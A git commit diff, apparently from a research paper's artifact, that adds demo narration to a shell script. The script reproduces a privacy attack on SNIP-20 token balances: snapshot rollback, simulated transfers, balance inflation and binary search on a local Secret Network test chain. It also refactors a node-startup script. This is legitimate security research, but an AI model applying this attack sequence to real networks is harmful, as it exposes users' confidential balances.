1b176f14420c15905526f41b6e36dd2e2306b1ed
Sylvain Bellemare <sbellem@gmail.com>
2024-02-22 22:22:51 -0800

    wip -- balance privacy attack

--- hacking/scripts/balance-privacy-attack.sh
+++ hacking/scripts/balance-privacy-attack.sh
@@ -5,10 +5,21 @@ set -e
 source ./scripts/demo_utils.sh
 source ./scripts/local_test_params.sh
 
+teebox info-panel "Artifact for Section 5.5" --title "Querying SNIP-20 account balances"
+
+teebox info-panel $'[bold]Victimo[/]: User whose secret balance is being spied on\n[bold]Atako[/]: Attacker who can modify the untrusted code base and simulate transactions and controls two addresses' --title "Cast of Characters"
+
+teebox log "Victim (Victimo :innocent:) address=${ACC2}, balance=12343"
+teebox log "Attacker (Atako :rage:) first address=${ACC0}, balance=10000"
+teebox log "Attacker (Atako :rage:) second address=${ACC1}, balance=10000"
+
 CONTRACT_ADDRESS=$(cat $BACKUP/contractAddress.txt)
 CODE_HASH=$(cat $BACKUP/codeHash.txt)
 
+teebox enter-prompt "Press [ Enter :leftwards_arrow_with_hook: ] to set snapshot ${snapshot_uniq_label}-start ..."
+
 snapshot_uniq_label=$(date '+%Y-%m-%d-%H:%M:%S')
+teebox log "Fork()    [light_goldenrod1]# set snapshot of database ${snapshot_uniq_label}-start[/]"
 set_snapshot "${snapshot_uniq_label}-start"
 
 # ACC2 is the victim
@@ -21,24 +32,35 @@ touch $BACKUP/adv_value
 
 
 # get boosting key and value
+teebox enter-prompt "Press [ Enter :leftwards_arrow_with_hook: ] to get boosting key and value ..."
+teebox log "get boosting key and value"
 generate_and_sign_transfer $ACC1 $ACC0 1 snip20_getkey
 rm -f $BACKUP/kv_store
 touch $BACKUP/kv_store
+
+teebox log "[bold]Simulate(Transfer(attacker_addr1, attacker_addr2, 1))[/]"
 simulate_tx snip20_getkey
+
 res=$(cat $BACKUP/simulate_result)
 echo $res
+teebox log "result of simulate_tx snip20_getkey ${res}"
 tag=$(sed '5q;d' $BACKUP/kv_store)
 key=${tag:6:-1}
 tag=$(sed '6q;d' $BACKUP/kv_store)
 value=${tag:8:-1}
+teebox log "key=${key}"
+teebox log "value=${value}"
 
 # boost balance of ACC1
 echo $key > $BACKUP/backup_adv_key
 echo $value > $BACKUP/backup_adv_value
 
+teebox enter-prompt "Press [ Enter :leftwards_arrow_with_hook: ] to set snapshot ${snapshot_uniq_label}-boost ..."
+teebox log "Fork()    [light_goldenrod1]# set snapshot of database[/] ${snapshot_uniq_label}-boost"
 set_snapshot "${snapshot_uniq_label}-boost"
 amount=10000
 
+teebox enter-prompt "Press [ Enter :leftwards_arrow_with_hook: ] to start Balance Inflation Attack ..."
 for i in {1..114}; do
     generate_and_sign_transfer $ACC1 $ACC0 $amount snip20_boost_1
     cp -f $BACKUP/backup_adv_key $BACKUP/adv_key
@@ -96,6 +118,9 @@ echo $value > $BACKUP/backup_adv_value
 lo=0
 hi=$(echo $(python -c "print 2**128-1"))
 cnt=0
+
+teebox enter-prompt "Press [ Enter :leftwards_arrow_with_hook: ] probing victim's balance ..."
+
 while [ $(echo $(python -c "print ${hi}-${lo}")) != "0" ]; do
     midv=$(echo $(python -c "print ((${hi}+${lo}+1))//2"))
     echo $lo $hi $midv
@@ -110,8 +135,13 @@ while [ $(echo $(python -c "print ${hi}-${lo}")) != "0" ]; do
     res=$(cat $BACKUP/simulate_result)
 
 
-    if [ $res != 0 ]; then hi=$(echo $(python -c "print ${midv}-1")); else lo=$midv; fi
-  cnt=$((cnt + 1))
+    if [ $res != 0 ]; then
+        hi=$(echo $(python -c "print ${midv}-1"));
+    else
+        lo=$midv;
+    fi
+
+    cnt=$((cnt + 1))
 done
 
 echo $(python -c "print 2**128-1-${lo}")
--- hacking/scripts/start_node.sh
+++ hacking/scripts/start_node.sh
@@ -30,22 +30,10 @@ while getopts ":hv" option; do
     esac
 done
 
-export SN_VERBOSE=$verbose
-
-#log() {
-#    if [[ $verbose -eq 1 ]]; then
-#        echo "$@"
-#    fi
-#}
-#
-#docker_log() {
-#    if [[ $verbose -eq 1 ]]; then
-#        docker compose --file ${COMPOSE_FILE} logs $1 --tail $2
-#    fi
-#}
+export SN_VERBOSE=${verbose}
 
 stop_network() {
-    if [[ $verbose -eq 1 ]]; then
+    if [[ ${verbose} -eq 1 ]]; then
         docker compose --file ${COMPOSE_FILE} down
     else
         docker compose --file ${COMPOSE_FILE} down &>/dev/null
@@ -53,7 +41,7 @@ stop_network() {
 }
 
 start_node() {
-    if [[ $verbose -eq 1 ]]; then
+    if [[ ${verbose} -eq 1 ]]; then
         docker compose --file ${COMPOSE_FILE} up $1 -d
     else
         docker compose --file ${COMPOSE_FILE} up $1 -d &>/dev/null
@@ -61,66 +49,58 @@ start_node() {
 }
 
 stop_node() {
-    if [[ $verbose -eq 1 ]]; then
+    if [[ ${verbose} -eq 1 ]]; then
         docker compose --file ${COMPOSE_FILE} stop $1
     else
         docker compose --file ${COMPOSE_FILE} stop $1 &>/dev/null
     fi
 }
 
+get_latest_block_height() {
+    node=$1
+    echo $(docker compose --file ${COMPOSE_FILE} exec ${node} \
+        curl -s http://localhost:26657/status | \
+        jq -e "(.result.sync_info.latest_block_height | tonumber)")
+}
+
+is_node_healthy() {
+    node=$1
+    block_height=$2
+    echo $(docker compose --file ${COMPOSE_FILE} exec ${node} \
+        curl -s http://localhost:26657/status | \
+        jq -e "(.result.sync_info.latest_block_height | tonumber) > ${block_height}")
+}
+
+wait_for_blocks() {
+    node=$1
+    block_height=$2
+    latest_block_height=$(get_latest_block_height localsecret-2)
+    echo "Current block height for node 2: ${latest_block_height}"
+    while [[ $(is_node_healthy localsecret-2 16) != "true" ]]
+    do
+        latest_block_height=$(get_latest_block_height localsecret-2)
+        echo "Current block height for node 2: ${latest_block_height}"
+        sleep 2
+    done
+}
+
 start_network() {
-    start_node localsecret-1
-    #docker compose --file ${COMPOSE_FILE} up localsecret-1 -d
-    sleep 5
+    if [[ ${verbose} -eq 1 ]]; then
+        docker compose --file ${COMPOSE_FILE} up -d
+    else
+        docker compose --file ${COMPOSE_FILE} up -d &>/dev/null
+    fi
 
-    genesis=$(docker compose --file ${COMPOSE_FILE} exec localsecret-1 ls /genesis)
-    while [[ "$genesis" != *"genesis.json"* ]]
-    do
-        log "Waiting for genesis file to be generated..."
-        genesis=$(docker compose --file ${COMPOSE_FILE} exec localsecret-1 ls /genesis)
-        docker_log localsecret-1 10
-        #docker compose --file ${COMPOSE_FILE} logs localsecret-1 --tail 10
-        sleep 5
-    done
-
-    start_node localsecret-2
-    #docker compose --file ${COMPOSE_FILE} up localsecret-2 -d
-
-    #waiting to build secretd and start node
-    progs=$(docker compose --file ${COMPOSE_FILE} exec localsecret-2 ps -ef)
-    while [[ "$progs" != *"secretd start --rpc.laddr tcp://0.0.0.0:26657"* ]]
-    do
-        log "Waiting for secretd build and node start..."
-        progs=$(docker compose --file ${COMPOSE_FILE} exec localsecret-2 ps -ef)
-        docker_log localsecret-2 10
-        #docker compose --file ${COMPOSE_FILE} logs localsecret-2 --tail 10
-        sleep 5
-    done
-
-    #waiting for blocks to start being produced before turning off localsecret-1
-    logs=$(docker compose --file ${COMPOSE_FILE} logs localsecret-2 --tail 10)
-    while [[ "$logs" != *"executed block"* ]]
-    do
-        log "Waiting for blocks to be produced..."
-        logs=$(docker compose --file ${COMPOSE_FILE} logs localsecret-2 --tail 10)
-        docker_log localsecret-2 10
-        #docker compose --file ${COMPOSE_FILE} logs localsecret-2 --tail 10
-        sleep 5
-    done
+    wait_for_blocks localsecret-2 24
 
     docker_log localsecret-2 10
-    #docker compose --file ${COMPOSE_FILE} logs localsecret-2 --tail 10
 
-    #./scripts/setup.sh
-    docker compose --file ${COMPOSE_FILE} exec localsecret-2 ./scripts/set_init_states_toy_swap.sh $verbose
-    docker compose --file ${COMPOSE_FILE} exec localsecret-2 ./scripts/setup_snip20.sh $verbose
-    #docker-compose exec localsecret-2 ./debug_scripts/set_init_states_simple.sh
+    docker compose --file ${COMPOSE_FILE} exec localsecret-2 ./scripts/set_init_states_toy_swap.sh ${verbose}
+    docker compose --file ${COMPOSE_FILE} exec localsecret-2 ./scripts/setup_snip20.sh ${verbose}
 
     stop_node localsecret-1
-    #docker compose --file ${COMPOSE_FILE} stop localsecret-1
 
     docker_log localsecret-2 5
-    #docker compose --file ${COMPOSE_FILE} logs localsecret-2 --tail 5
 }
 
 print_status() {
